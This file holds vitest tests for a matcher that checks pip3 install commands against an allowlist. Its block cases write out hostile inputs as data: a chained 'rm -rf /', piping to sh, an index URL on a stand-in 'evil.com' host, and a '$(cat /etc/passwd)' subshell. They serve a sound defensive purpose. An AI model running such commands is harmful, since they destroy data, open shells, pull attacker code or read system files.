import { describe, it, expect } from "vitest";
import { matchPip3Install } from "../../src/matchers/pip3-install.js";

const PKGS = ["python-dotenv", "requests", "boto3"];

describe("matchPip3Install — wildcard *", () => {
  it("allows any package when * present", () => {
    expect(matchPip3Install("pip3 install anything -q", ["*"])).toBe(true);
  });

  it("allows unknown package with * and echo suffix", () => {
    expect(matchPip3Install('pip3 install some-random-pkg && echo "ok"', ["*"])).toBe(true);
  });
});

describe("matchPip3Install — allow", () => {
  it("bare install", () => {
    expect(matchPip3Install("pip3 install python-dotenv", PKGS)).toBe(true);
  });

  it("-q flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv -q", PKGS)).toBe(true);
  });

  it("--quiet flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --quiet", PKGS)).toBe(true);
  });

  it("-U flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv -U", PKGS)).toBe(true);
  });

  it("--upgrade flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --upgrade", PKGS)).toBe(true);
  });

  it("--user flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --user", PKGS)).toBe(true);
  });

  it("version specifier stripped", () => {
    expect(matchPip3Install("pip3 install python-dotenv==1.0.0 -q", PKGS)).toBe(true);
  });

  it("version range stripped", () => {
    expect(matchPip3Install("pip3 install requests>=2.0 -q", PKGS)).toBe(true);
  });

  it("multiple allowed packages", () => {
    expect(matchPip3Install("pip3 install python-dotenv requests -q", PKGS)).toBe(true);
  });

  it("&& echo suffix", () => {
    expect(matchPip3Install('pip3 install python-dotenv -q && echo "ok"', PKGS)).toBe(true);
  });

  it("&& echo without quotes", () => {
    expect(matchPip3Install("pip3 install python-dotenv -q && echo ok", PKGS)).toBe(true);
  });
});

describe("matchPip3Install — block", () => {
  it("unlisted package", () => {
    expect(matchPip3Install("pip3 install evil-package", PKGS)).toBe(false);
  });

  it("one unlisted in multi-package install", () => {
    expect(matchPip3Install("pip3 install python-dotenv evil-package", PKGS)).toBe(false);
  });

  it("no package — only flags", () => {
    expect(matchPip3Install("pip3 install -q", PKGS)).toBe(false);
  });

  it("unknown flag", () => {
    expect(matchPip3Install("pip3 install python-dotenv --index-url https://evil.com", PKGS)).toBe(false);
  });

  it("requirements file flag", () => {
    expect(matchPip3Install("pip3 install -r requirements.txt", PKGS)).toBe(false);
  });

  it("&& non-echo command", () => {
    expect(matchPip3Install("pip3 install python-dotenv && rm -rf /", PKGS)).toBe(false);
  });

  it("three-segment chain", () => {
    expect(matchPip3Install("pip3 install python-dotenv && echo ok && sh", PKGS)).toBe(false);
  });

  it("pipe to sh", () => {
    expect(matchPip3Install("pip3 install python-dotenv | sh", PKGS)).toBe(false);
  });

  it("pip not pip3", () => {
    expect(matchPip3Install("pip install python-dotenv", PKGS)).toBe(false);
  });

  it("empty allowed_packages", () => {
    expect(matchPip3Install("pip3 install python-dotenv", [])).toBe(false);
  });

  it("* still blocks unknown flags", () => {
    expect(matchPip3Install("pip3 install anything --index-url https://evil.com", ["*"])).toBe(false);
  });

  it("* still blocks && non-echo", () => {
    expect(matchPip3Install("pip3 install anything && rm -rf /", ["*"])).toBe(false);
  });

  it("subshell expansion blocked", () => {
    expect(matchPip3Install("pip3 install $(cat /etc/passwd)", PKGS)).toBe(false);
  });
});
